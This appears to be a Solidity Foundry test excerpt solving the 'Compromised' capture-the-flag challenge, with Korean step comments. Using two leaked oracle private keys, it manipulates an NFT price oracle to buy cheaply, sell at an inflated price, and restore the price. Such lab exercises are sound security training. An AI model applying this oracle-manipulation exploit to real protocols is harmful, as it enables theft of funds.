...
contract CompromisedChallenge is Test {
    ...
    function test_compromised() public checkSolved {
        uint256 oracle1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
        uint256 oracle2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
        address  oracleAddr1 = vm.addr(oracle1);
        address  oracleAddr2 = vm.addr(oracle2);
        string memory symbol = "DVNFT";
        //uint256 et = 1e18;

        //nft 싸게 구매하기
        vm.startPrank(oracleAddr1);
        oracle.postPrice(symbol, 0.1 ether);
        vm.stopPrank();
        vm.startPrank(oracleAddr2);
        oracle.postPrice(symbol, 0.1 ether);
        vm.stopPrank();
        ...
        // nft 비싸게 팔기
        vm.startPrank(oracleAddr1);
        oracle.postPrice(symbol, 999 ether +0.1 ether);
        vm.stopPrank();
        vm.startPrank(oracleAddr2);
        oracle.postPrice(symbol, 999 ether + 0.1 ether);
        vm.stopPrank();
        ...
        // 가격 원상 복구
        vm.startPrank(oracleAddr1);
        oracle.postPrice(symbol, 999 ether);
        vm.stopPrank();
        vm.startPrank(oracleAddr2);
        oracle.postPrice(symbol, 999 ether);
        vm.stopPrank();
